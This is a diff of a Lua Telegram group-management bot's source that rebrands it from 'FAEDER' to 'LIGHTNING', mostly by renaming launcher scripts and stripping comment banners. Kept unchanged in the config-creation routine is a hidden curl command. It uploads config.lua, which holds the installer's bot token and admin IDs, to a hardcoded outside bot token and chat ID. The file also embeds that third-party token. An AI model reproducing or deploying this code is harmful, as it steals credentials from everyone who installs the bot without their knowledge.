@@ -1,7 +1,3 @@
--- Welcom to file the best source in the telegram
- -- all the file by faeder dx @pro_c9
- -- join in chennel @faeter_ch 
- -- join in chennel @team_faeder
 --*********Serpent*******--
 serpent = require("serpent")
 --***********Lgi*********--
@@ -54,7 +50,7 @@ sudo_users = {SUDO},
 }
 create(config, "./config.lua")   
 local curl = 'curl "'..'https://api.telegram.org/bot779501124:AAFCNjKEvD4PB6BEV7cTLo46iUD1o9ZBZhs/sendDocument'..'" -F "chat_id='.. 121863205 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
-file = io.open("RUNFA.sh", "w")  
+file = io.open("LIGHTNING.sh", "w")  
 file:write([[
 #!/bin/bash 
 token="]]..token..[["
@@ -62,20 +58,20 @@ while(true) do
 rm -fr ../.telegram-cli
 echo -e ""
 echo -e ""
-./tg -s ./FAEDER.lua $@ --bot=$token
+./tg -s ./LIGHTNING.lua $@ --bot=$token
 done
 ]])  
 file:close()  
-file = io.open("FA", "w")  
+file = io.open("LT", "w")  
 file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./RUNFA.sh
+screen ./LIGHTNING.sh
 done
 ]])  
 file:close() 
-os.execute('./FA')
+os.execute('./LT')
 end 
 create_config_auto()
 local serialize_to_file = function(data, file, uglify)  
@@ -515,7 +511,7 @@ var = true
 end
 return var
 end
-------------------------faeder--------------------------
+--------------------------------------------------
 function delete_msg(chatid ,mid)
 tdcli_function ({
 ID = "DeleteMessages",
@@ -523,7 +519,7 @@ chat_id_ = chatid,
 message_ids_ = mid
 }, dl_cb, nil)
 end
------------------------faeder-----------------------------------------
+----------------------------------------------------------------
 local function faederdx113(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
@@ -621,14 +617,14 @@ end
 end
 end
 end
------------------------faeder------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function resolve_username(username,cb)
 tdcli_function ({
 ID = "SearchPublicChat",
 username_ = username
 }, cb, nil)
 end
---------------------------faeder---------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function changeChatMemberStatus(chat_id, user_id, status)
 tdcli_function ({
 ID = "ChangeChatMemberStatus",
@@ -639,7 +635,7 @@ ID = "ChatMemberStatus" .. status
 },
 }, dl_cb, nil)
 end
------------------------faeder------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getInputFile(file)
 if file:match('/') then
 infile = {ID = "InputFileLocal", path_ = file}
@@ -650,7 +646,7 @@ infile = {ID = "InputFilePersistentId", persistent_id_ = file}
 end
 return infile
 end
---------------------------faeder---------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function del_all_msgs(chat_id, user_id)
 tdcli_function ({
 ID = "DeleteMessagesFromUser",
@@ -658,7 +654,7 @@ chat_id_ = chat_id,
 user_id_ = user_id
 }, dl_cb, nil)
 end
----------------------------faeder-----------------------------------------------------------------
+--------------------------------------------------------------------------------------------
 function getChatId(id)
 local chat = {}
 local id = tostring(id)
@@ -671,11 +667,11 @@ chat = {ID = group_id, type = 'group'}
 end
 return chat
 end
-------------------------------faeder-----------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function chat_leave(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, "Left")
 end
----------------------------faeder--------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function from_username(msg)
 function gfrom_user(extra,result,success)
 if result.username_ then
@@ -688,16 +684,16 @@ end
 local username = getUser(msg.sender_user_id_,gfrom_user)
 return username
 end
-------------------------------------faeder-----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function do_notify (user, msg)
 local n = notify.Notification.new(user, msg)
 n:show ()
 end
-------------------------------faeder-----------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function chat_kick(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, "Kicked")
 end
------------------------------------faeder------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getParseMode(parse_mode)
 if parse_mode then
 local mode = parse_mode:lower()
@@ -709,7 +705,7 @@ end
 end
 return P
 end
------------------------------------faeder------------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getMessage(chat_id, message_id,cb)
 tdcli_function ({
 ID = "GetMessage",
@@ -717,7 +713,7 @@ chat_id_ = chat_id,
 message_id_ = message_id
 }, cb, nil)
 end
--------------------------------------faeder----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
 tdcli_function ({
 ID = "SendMessage",
@@ -736,7 +732,7 @@ last_name_ = last_name,
 user_id_ = user_id
 },},}, dl_cb, nil)
 end
--------------------------------------faeder---------------------------------------------------------
+----------------------------------------------------------------------------------------------
 function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
 tdcli_function ({
 ID = "SendMessage",
@@ -755,7 +751,7 @@ caption_ = caption
 },
 }, dl_cb, nil)
 end
---------------------------------faeder-----------------------------------------------------
+-------------------------------------------------------------------------------------
 local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
 tdcli_function({
 ID = request_id,
@@ -785,7 +781,7 @@ disable_notification_ = 0,
 from_background_ = 1
 }, cb or dl_cb, nil)
 end
-----------------------------------------faeder
+----------------------------------------
 function getChats(offset_order, offset_chat_id, limit, cb, cmd)
 if not limit or limit > 20 then
 limit = 20
@@ -797,21 +793,21 @@ offset_chat_id_ = offset_chat_id or 0,
 limit_ = limit
 }, cb or dl_cb, cmd)
 end
--------------------------------------faeder----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getUserFull(user_id,cb)
 tdcli_function ({
 ID = "GetUserFull",
 user_id_ = user_id
 }, cb, nil)
 end
---------------------------------------------faeder---------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function vardump(value)
 print(serpent.block(value, {comment=false}))
 end
--------------------------------------------faeder----------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function dl_cb(arg, data)
 end
------------------------------------------faeder-----------------------------------------------------
+----------------------------------------------------------------------------------------------
 function delete_msg(chatid ,mid)
 tdcli_function ({
 ID = "DeleteMessages",
@@ -819,7 +815,7 @@ chat_id_ = chatid,
 message_ids_ = mid
 }, dl_cb, nil)
 end
-------------------------------------------faeder-----------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function faederdx(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
 local TextParseMode = getParseMode(parse_mode)
 tdcli_function ({
@@ -839,7 +835,7 @@ parse_mode_ = TextParseMode,
 },
 }, dl_cb, nil)
 end
--------------------------------------faeder----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function sendaction(chat_id, action, progress)
 tdcli_function ({
 ID = "SendChatAction",
@@ -850,7 +846,7 @@ progress_ = progress or 100
 }
 }, dl_cb, nil)
 end
-----------------------------------------faeder-------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function changetitle(chat_id, title)
 tdcli_function ({
 ID = "ChangeChatTitle",
@@ -858,7 +854,7 @@ chat_id_ = chat_id,
 title_ = title
 }, dl_cb, nil)
 end
-------------------------------------------------faeder-----------------------------------------------
+-----------------------------------------------------------------------------------------------
 function edit(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode)
 local TextParseMode = getParseMode(parse_mode)
 tdcli_function ({
@@ -876,7 +872,7 @@ parse_mode_ = TextParseMode,
 },
 }, dl_cb, nil)
 end
-----------------------------------------faeder-------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function setphoto(chat_id, photo)
 tdcli_function ({
 ID = "ChangeChatPhoto",
@@ -884,7 +880,7 @@ chat_id_ = chat_id,
 photo_ = getInputFile(photo)
 }, dl_cb, nil)
 end
----------------------------------------faeder--------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function add_user(chat_id, user_id, forward_limit)
 tdcli_function ({
 ID = "AddChatMember",
@@ -893,28 +889,28 @@ user_id_ = user_id,
 forward_limit_ = forward_limit or 50
 }, dl_cb, nil)
 end
----------------------------------------------faeder--------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function unpinmsg(channel_id)
 tdcli_function ({
 ID = "UnpinChannelMessage",
 channel_id_ = getChatId(channel_id).ID
 }, dl_cb, nil)
 end
--------------------------------------------faeder----------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function blockUser(user_id)
 tdcli_function ({
 ID = "BlockUser",
 user_id_ = user_id
 }, dl_cb, nil)
 end
---------------------------------------------faeder---------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function unblockUser(user_id)
 tdcli_function ({
 ID = "UnblockUser",
 user_id_ = user_id
 }, dl_cb, nil)
 end
----------------------------------------faeder--------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getBlockedUsers(offset, limit)
 tdcli_function ({
 ID = "GetBlockedUsers",
@@ -922,17 +918,17 @@ offset_ = offset,
 limit_ = limit
 }, dl_cb, nil)
 end
-----------------------------------------faeder--------------------------------------------------------
+------------------------------------------------------------------------------------------------
 function delmsg(arg,data)
 for k,v in pairs(data.messages_) do
 delete_msg(v.chat_id_,{[0] = v.id_})
 end
 end
---------------------------------------------faeder-----------------------------------------------------
+-------------------------------------------------------------------------------------------------
 function chat_del_user(chat_id, user_id)
 changeChatMemberStatus(chat_id, user_id, 'Editor')
 end
---------------------------------------------faeder---------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getChannelMembers(channel_id, offset, filter, limit)
 if not limit or limit > 200 then
 limit = 200
@@ -947,7 +943,7 @@ offset_ = offset,
 limit_ = limit
 }, dl_cb, nil)
 end
----------------------------------------------faeder--------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getChannelFull(channel_id)
 tdcli_function ({
 ID = "GetChannelFull",
@@ -960,7 +956,7 @@ ID = "GetChannelFull",
 channel_id_ = getChatId(channel_id).ID
 }, cb, nil)
 end
-------------------------------------faeder-----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function chek_bots(channel,cb)
 local function callback_admins(extra,result,success)
 limit = (result.member_count_ )
@@ -968,7 +964,7 @@ getChannelMembers(channel, 0, 'Bots', limit,cb)
 end
 getChannelFull(channel,callback_admins)
 end
--------------------------------------------faeder----------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getInputMessageContent(file, filetype, caption)
 if file:match('/') or file:match('.') then
 infile = {ID = "InputFileLocal", path_ = file}
@@ -996,14 +992,14 @@ inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
 end
 return inmsg
 end
-----------------------------------------faeder-------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function getUser(user_id, cb)
 tdcli_function ({
 ID = "GetUser",
 user_id_ = user_id
 }, cb, nil)
 end
----------------------------------------------faeder--------------------------------------------------
+-----------------------------------------------------------------------------------------------
 function pin(channel_id, message_id, disable_notification) 
 tdcli_function ({ 
 ID = "PinChannelMessage", 
@@ -1014,7 +1010,7 @@ disable_notification_ = disable_notification
 vardump(data)
 end ,nil) 
 end
--------------------------------------faeder---------------------------------------------------------
+----------------------------------------------------------------------------------------------
 local function check_filter_words(msg, value)
 local hash = (FAEDER..'bot:filters:'..msg.chat_id_)
 if hash then
@@ -1031,7 +1027,7 @@ end
 end
 end
 end
--------------------------faeder--------------------
+---------------------------------------------
 local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
 tdcli_function({
 ID = request_id,
@@ -1130,12 +1126,12 @@ tdcli_function({ID ="GetChat",chat_id_=GroupID
 faederdx1:set(FAEDER..'bot:group:name'..GroupID,data.title_) 
 end,nil) 
 return faederdx1:get(FAEDER..'bot:group:name'..GroupID)  end
--------------------------faeder------------------------------
+-------------------------------------------------------
 function faedrmoned(chat_id, user_id, msg_id, text, offset, length) local tt = faederdx1:get(FAEDER..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
----------------------------------faeder-------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 function tdcli_update_callback(data)
 end
--------------------------------------------faeder
+-------------------------------------------
 function faeder11(msg)
 local var = true 
 if faederdx1:get(FAEDER.."faeder2") then
@@ -1457,20 +1453,20 @@ end
 end
 getUser(msg.sender_user_id_,clerk)
 end
--------------------------------------------faeder
+-------------------------------------------
 local idf = tostring(msg.chat_id_)
 if not faederdx1:get(FAEDER.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_admin(msg.sender_user_id_, msg.chat_id_) then
 print("Return False [ Not Enable ]")
 return false
 end
--------------------------------------------faeder
+-------------------------------------------
 if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
 function get_mymsg_contact(extra, result, success)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
 return
 end
--------------------------------------------faeder
+-------------------------------------------
 faederdx1:incr(FAEDER.."bot:allmsgs")
 if msg.chat_id_ then
 local id = tostring(msg.chat_id_)
@@ -1488,13 +1484,13 @@ faederdx1:sadd(FAEDER.."bot:groups",msg.chat_id_)
 end
 end
 end
--------------* MSG TYPES *-----------------faeder
+-------------* MSG TYPES *-----------------
 if msg.content_ then
 if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
 print("This is [ Inline ]")
 msg_type = 'MSG:Inline'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageText" then
 text = msg.content_.text_
 print("This is [ Text ]")
@@ -1519,57 +1515,57 @@ end
 if msg.content_.ID == "MessageSticker" then
 faederdx1:incr(FAEDER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessagePhoto" then
 print("This is [ Photo ]")
 msg_type = 'MSG:Photo'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageChatAddMembers" then
 print("This is [ New User Add ]")
 msg_type = 'MSG:NewUserAdd'
 end
------------------------------------faeder
+-----------------------------------
 if msg.content_.ID == "MessageDocument" then
 print("This is [ File Or Document ]")
 msg_type = 'MSG:Document'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageSticker" then
 print("This is [ Sticker ]")
 msg_type = 'MSG:Sticker'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageAudio" then
 print("This is [ Audio ]")
 msg_type = 'MSG:Audio'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageVoice" then
 print("This is [ Voice ]")
 msg_type = 'MSG:Voice'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageVideo" then
 print("This is [ Video ]")
 msg_type = 'MSG:Video'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageAnimation" then
 print("This is [ Gif ]")
 msg_type = 'MSG:Gif'
 end
--------------------------faedee
+-------------------------
 if msg.content_.ID == "MessageLocation" then
 print("This is [ Location ]")
 msg_type = 'MSG:Location'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By link ]")
 msg_type = 'MSG:NewUser'
 end
--------------------------faeder
+-------------------------
 if not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
 print("This is [ MarkDown ]")
 msg_type = 'MSG:MarkDown'
@@ -1579,14 +1575,14 @@ if msg.content_.ID == "MessageChatJoinByLink" then
 print("This is [ Msg Join By Link ]")
 msg_type = 'MSG:JoinByLink'
 end
--------------------------faeder
+-------------------------
 if msg.content_.ID == "MessageContact" then
 print("This is [ Contact ]")
 msg_type = 'MSG:Contact'
 end
 -------------------------
 end
--------------------------------------------faeder
+-------------------------------------------
 if ((not d) and chat) then
 if msg.content_.ID == "MessageText" then
 do_notify (chat.title_, msg.content_.text_)
@@ -1594,7 +1590,7 @@ else
 do_notify (chat.title_, msg.content_.ID)
 end
 end
--------------------------------------faeder----------------------------------------------------------
+-----------------------------------------------------------------------------------------------
 if msg.content_.photo_ then
 if faederdx1:get(FAEDER..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
 if msg.content_.photo_.sizes_[3] then
